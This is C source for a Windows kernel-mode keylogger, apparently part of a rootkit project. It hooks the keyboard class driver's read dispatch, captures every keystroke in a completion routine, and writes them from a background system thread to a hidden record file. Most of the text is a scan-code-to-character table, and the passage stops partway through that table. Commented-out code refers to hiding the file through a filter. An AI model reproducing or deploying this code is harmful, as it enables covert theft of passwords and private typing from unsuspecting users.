#include "rk.h"
#include <ntddkbd.h>
#include "DefSystemVar.h"
#include "SystemPreInit.h"
#include "KLog.h"

ULONG g_NumPendingIrps = 0;

PDRIVER_DISPATCH g_DispatchRead = NULL;
KEY_STATE g_KeyState = {0};
LIST_ENTRY g_ListKbdRecord;
KSPIN_LOCK g_KbdRecordSpinLock;
HANDLE g_hKbdRecord = NULL;
PFILE_OBJECT pKbdRecordFileObject = NULL;
HANDLE g_hWorkRecord = NULL;
BOOLEAN g_bExitThread = FALSE;

NTSTATUS WriteKbdRecord(PKEY_INFO pKeyInfo)
{
	NTSTATUS Status;
	UNICODE_STRING UniRecordFile;
	OBJECT_ATTRIBUTES ObjectAttributes;
	IO_STATUS_BLOCK IoStatus;
	LARGE_INTEGER LOffset;
	//ULONG ulRetBytes;
	FILE_STANDARD_INFORMATION FiltStandardInfo;

	if (NULL == g_hKbdRecord)
	{
		RtlInitUnicodeString(&UniRecordFile,KEYBOARD_RECORD_FILE);
		InitializeObjectAttributes(&ObjectAttributes,&UniRecordFile,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,0);
		//if (g_Rk2017RunTimeLibrary.bIsStartFilter)
		//{
		//	Status = FltCreateFile(g_Rk2017RunTimeLibrary.phFltHide, \
		//		NULL, \
		//		&g_hKbdRecord, \
		//		FILE_ALL_ACCESS, \
		//		&ObjectAttributes, \
		//		&IoStatus, \
		//		NULL, \
		//		FILE_ATTRIBUTE_NORMAL, \
		//		FILE_SHARE_READ | FILE_SHARE_WRITE, \
		//		FILE_OPEN_IF, \
		//		FILE_SYNCHRONOUS_IO_NONALERT, \
		//		NULL, \
		//		0, \
		//		0);
		//	if (NT_ERROR(Status))
		//	{
		//		return Status;
		//	}
		//}
		//else
		//{
			Status = ZwCreateFile(&g_hKbdRecord, \
				FILE_ALL_ACCESS, \
				&ObjectAttributes, \
				&IoStatus, \
				NULL, \
				FILE_ATTRIBUTE_NORMAL, \
				FILE_SHARE_READ | FILE_SHARE_WRITE, \
				FILE_OPEN_IF, \
				FILE_SYNCHRONOUS_IO_NONALERT, \
				NULL, \
				0);
			if (NT_ERROR(Status))
			{
				return Status;
			}
		//}
	}
	//if (g_Rk2017RunTimeLibrary.bIsStartFilter && g_Rk2017RunTimeLibrary.pFltInstance)
	//{
	//	Status = ObReferenceObjectByHandle(g_hKbdRecord, \
	//		FILE_ALL_ACCESS, \
	//		*IoFileObjectType, \
	//		KernelMode, \
	//		&pKbdRecordFileObject, \
	//		NULL);
	//	if (NT_ERROR(Status))
	//	{
	//		FltClose(g_hKbdRecord);
	//		return Status;
	//	}
	//	ObDereferenceObject(pKbdRecordFileObject);
	//	Status = FltQueryInformationFile(g_Rk2017RunTimeLibrary.pFltInstance, \
	//		pKbdRecordFileObject, \
	//		&FiltStandardInfo, \
	//		sizeof(FILE_STANDARD_INFORMATION), \
	//		FileStandardInformation, \
	//		&ulRetBytes);
	//	LOffset.HighPart = FiltStandardInfo.EndOfFile.HighPart;
	//	LOffset.LowPart = FiltStandardInfo.EndOfFile.LowPart;
	//	Status = FltWriteFile(g_Rk2017RunTimeLibrary.pFltInstance, \
	//		pKbdRecordFileObject, \
	//		&LOffset, \
	//		strlen(pKeyInfo->pShowKeyDat), \
	//		pKeyInfo->pShowKeyDat, \
	//		FLTFL_IO_OPERATION_NON_CACHED, \
	//		&ulRetBytes, \
	//		NULL, \
	//		NULL);
	//	if (NT_ERROR(Status))
	//	{
	//		FltClose(g_hKbdRecord);
	//		g_hKbdRecord = NULL;
	//	}
	//	FltClose(g_hKbdRecord);
	//}
	//else
	//{
		Status = ZwQueryInformationFile(g_hKbdRecord, \
			&IoStatus, \
			&FiltStandardInfo, \
			sizeof(FILE_STANDARD_INFORMATION), \
			FileStandardInformation);
		LOffset.HighPart = FiltStandardInfo.EndOfFile.HighPart;
		LOffset.LowPart = FiltStandardInfo.EndOfFile.LowPart;
		Status = ZwWriteFile(g_hKbdRecord, \
			NULL, \
			NULL, \
			NULL, \
			&IoStatus, \
			pKeyInfo->pShowKeyDat, \
			strlen(pKeyInfo->pShowKeyDat), \
			&LOffset, \
			0);
		if (NT_ERROR(Status))
		{
			ZwClose(g_hKbdRecord);
			g_hKbdRecord = NULL;
		}
		ZwClose(g_hKbdRecord);
	//}
	g_hKbdRecord = NULL;
	return Status;
}
NTSTATUS KbdFltCompletionRoutine(PDEVICE_OBJECT pDeviceObject,PIRP pIrp,PVOID pContext)
{
	PKEYBOARD_INPUT_DATA pKbdInputDat;
	PKEY_INFO pKeyInfo;
	ULONG ulCount,uli;
	//KIRQL OldIrql;

	pKbdInputDat = NULL;
	pKeyInfo = NULL;

	if (NT_SUCCESS(pIrp->IoStatus.Status))
	{
		pKbdInputDat = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		ulCount = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
		for (uli = 0;uli < ulCount;uli++)
		{
			switch(pKbdInputDat->Flags)
			{
			case KEY_MAKE:
				if (pKbdInputDat->MakeCode == 0x2A || \
					pKbdInputDat->MakeCode == 0x36)
				{
					g_KeyState.bIsShift = TRUE;
				}
				//DbgPrint("\nFlags:KEY_MAKE\n");
				break;
			case KEY_BREAK:
				if (pKbdInputDat->MakeCode == 0x2A || \
					pKbdInputDat->MakeCode == 0x36)
				{
					g_KeyState.bIsShift = FALSE;
				}
				else
				{
					do 
					{
						pKeyInfo = (PKEY_INFO)ExAllocatePool(NonPagedPool,sizeof(KEY_INFO));
					} while (NULL == pKeyInfo);
					RtlZeroMemory(pKeyInfo,sizeof(KEY_INFO));

					pKeyInfo->uMakeCode = pKbdInputDat->MakeCode;
					pKeyInfo->uKeyFlags = pKbdInputDat->Flags;
					GetKeyFromMakeCode(pKeyInfo,&g_KeyState);
					InitializeListHead(&pKeyInfo->NextKeyInfo);

					KeAcquireSpinLockAtDpcLevel(&g_KbdRecordSpinLock);
					InsertTailList(&g_ListKbdRecord,&pKeyInfo->NextKeyInfo);
					KeReleaseSpinLockFromDpcLevel(&g_KbdRecordSpinLock);
				}
				//DbgPrint("\nFlags:KEY_BREAK\n");
				break;
			}
		}
	}
	if (pIrp->PendingReturned)
	{
		IoMarkIrpPending(pIrp);
	}
	g_NumPendingIrps--;
	if ((pIrp->StackCount > (ULONG)1) && (pContext != NULL))
	{
		return ((PIO_COMPLETION_ROUTINE)pContext)(pDeviceObject,pIrp,NULL);
	}
	return pIrp->IoStatus.Status;
}
NTSTATUS NewDispatchRead(IN PDEVICE_OBJECT pDeviceObject,IN PIRP pIrp)
{
	PIO_STACK_LOCATION pIrpStack;

	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	pIrpStack->Control = SL_INVOKE_ON_SUCCESS;

	if (NT_SUCCESS(pIrp->IoStatus.Status))
	{
		pIrpStack->Context = (PVOID)pIrpStack->CompletionRoutine;
		pIrpStack->CompletionRoutine = KbdFltCompletionRoutine;
	}
	if (pIrp->PendingReturned)
	{
		IoMarkIrpPending(pIrp);
	}
	g_NumPendingIrps++;
	return g_DispatchRead(pDeviceObject,pIrp);
}
VOID WriteRecordThread(PVOID pStartContext)
{
	PLIST_ENTRY pCurList;
	PKEY_INFO pKeyInfo;
	KIRQL OldIrql;

	while (TRUE)
	{
		if (IsListEmpty(&g_ListKbdRecord) == FALSE)
		{
			pCurList = g_ListKbdRecord.Flink;
			while (pCurList != &g_ListKbdRecord)
			{
				pKeyInfo = (PKEY_INFO)pCurList;
				//pKeyInfo = (PKEY_INFO)CONTAINING_RECORD(pCurList,KEY_INFO,NextKeyInfo);
				if (MmIsAddressValid(pKeyInfo) && NULL != pKeyInfo)
				{
					KeAcquireSpinLock(&g_KbdRecordSpinLock,&OldIrql);
					RemoveEntryList(&pKeyInfo->NextKeyInfo);
					KeReleaseSpinLock(&g_KbdRecordSpinLock,OldIrql);
					WriteKbdRecord(pKeyInfo);
					if (pKeyInfo->pShowKeyDat)
					{
						ExFreePool(pKeyInfo->pShowKeyDat);
						//pKeyInfo->pShowKeyDat = NULL;
					}
					//if (pKeyInfo)
					//{
					//	ExFreePool(pKeyInfo);
					//}
				}
				pCurList = pCurList->Flink;
			}
		}
		if (g_bExitThread)
		{
			break;
		}
		SystemSleep(3);
	}
	PsTerminateSystemThread(TRUE);
}
NTSTATUS HookKbdClass(BOOLEAN bHook)
{
	NTSTATUS Status;
	UNICODE_STRING UniKbdClassName;
	PDRIVER_OBJECT pKbdDrvObj;
	OBJECT_ATTRIBUTES ThreadObjectAttributes;
	PVOID pThread;

	pThread = NULL;

	RtlInitUnicodeString(&UniKbdClassName,L"\\Driver\\kbdclass");
	Status = ObReferenceObjectByName(&UniKbdClassName, \
		OBJ_CASE_INSENSITIVE, \
		NULL, \
		0, \
		*IoDriverObjectType, \
		KernelMode, \
		NULL, \
		&pKbdDrvObj);
	if (NT_ERROR(Status))
	{
		return Status;
	}
	ObDereferenceObject(pKbdDrvObj);

	InitializeListHead(&g_ListKbdRecord);
	KeInitializeSpinLock(&g_KbdRecordSpinLock);

	if (bHook)
	{
		InitializeObjectAttributes(&ThreadObjectAttributes, \
			NULL, \
			OBJ_KERNEL_HANDLE, \
			NULL, \
			NULL);
		Status = PsCreateSystemThread(&g_hWorkRecord, \
			THREAD_ALL_ACCESS, \
			&ThreadObjectAttributes, \
			NULL, \
			NULL, \
			WriteRecordThread, \
			NULL);
		g_DispatchRead = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
		pKbdDrvObj->MajorFunction[IRP_MJ_READ] = (PDRIVER_DISPATCH)NewDispatchRead;
	}
	else
	{
		Status = ObReferenceObjectByHandle(g_hWorkRecord, \
			THREAD_ALL_ACCESS, \
			*PsThreadType, \
			KernelMode, \
			&pThread, \
			NULL);
		if (NT_SUCCESS(Status))
		{
			ObDereferenceObject(pThread);
			KeWaitForSingleObject(pThread, \
				Executive, \
				KernelMode, \
				TRUE, \
				(PLARGE_INTEGER)0);
		}
		pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_DispatchRead;
	}
	return Status;
}
BOOLEAN GetKeyCase(PKEY_STATE pKeyState)
{
	BOOLEAN bCase;

	bCase = FALSE;

	if (pKeyState->bIsShift)
	{
		if (pKeyState->bIsCapsLock)
		{
			bCase = FALSE;
		}
		else
		{
			bCase = TRUE;
		}
	}
	else
	{
		if (pKeyState->bIsCapsLock)
		{
			bCase = TRUE;
		}
		else
		{
			bCase = FALSE;
		}
	}
	return bCase;
}
BOOLEAN GetKeyFromMakeCode(PKEY_INFO pKeyInfo,PKEY_STATE pKeyState)
{
	ULONG ulLength;
	BOOLEAN bRet;

	bRet = FALSE;

	switch(pKeyInfo->uMakeCode)
	{
	case 0x01:
		ulLength = strlen("[ESC]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[ESC]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x02:
		ulLength = strlen("1");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"!",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"1",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x03:
		ulLength = strlen("2");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"@",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"2",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x04:
		ulLength = strlen("3");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"#",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"3",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x05:
		ulLength = strlen("4");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"$",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"4",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x06:
		ulLength = strlen("5");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"%",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"5",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x07:
		ulLength = strlen("6");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"^",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"6",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x08:
		ulLength = strlen("7");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"&",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"7",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x09:
		ulLength = strlen("8");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"*",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"8",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x0A:
		ulLength = strlen("9");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"(",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"9",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x0B:
		ulLength = strlen("0");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,")",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"0",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x0C:
		ulLength = strlen("-");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"_",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"-",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x0D:
		ulLength = strlen("=");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"+",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"=",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x0E:
		ulLength = strlen("[Back]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Back]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x0F:
		ulLength = strlen("[TABLE]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[TABLE]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x10:
		ulLength = strlen("q");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"Q",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"q",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x11:
		ulLength = strlen("w");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"W",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"w",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x12:
		ulLength = strlen("e");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"E",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"e",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x13:
		ulLength = strlen("r");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"R",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"r",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x14:
		ulLength = strlen("t");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"T",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"t",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x15:
		ulLength = strlen("y");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"Y",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"y",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x16:
		ulLength = strlen("u");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"U",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"u",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x17:
		ulLength = strlen("i");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"I",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"i",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x18:
		ulLength = strlen("o");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"O",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"o",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x19:
		ulLength = strlen("p");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"P",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"p",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x1A:
		ulLength = strlen("\"[\"");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"\"{\"",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"\"[\"",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x1B:
		ulLength = strlen("\"]\"");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"\"}\"",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"\"]\"",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x1C:
		ulLength = strlen("[ENTER]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[ENTER]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x1D:
		ulLength = strlen("[RIGHT-CTRL]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[RIGHT-CTRL]",ulLength);
			if (g_KeyState.bIsCtrl)
			{
				g_KeyState.bIsCtrl = FALSE;
			}
			else
			{
				g_KeyState.bIsCtrl = TRUE;
			}
			bRet = TRUE;
		}
		break;
	case 0x1E:
		ulLength = strlen("a");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"A",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"a",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x1F:
		ulLength = strlen("s");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"S",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"s",ulLength);
			}
		}
		break;
	case 0x20:
		ulLength = strlen("d");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"D",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"d",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x21:
		ulLength = strlen("f");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"F",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"f",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x22:
		ulLength = strlen("g");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"G",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"g",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x23:
		ulLength = strlen("h");
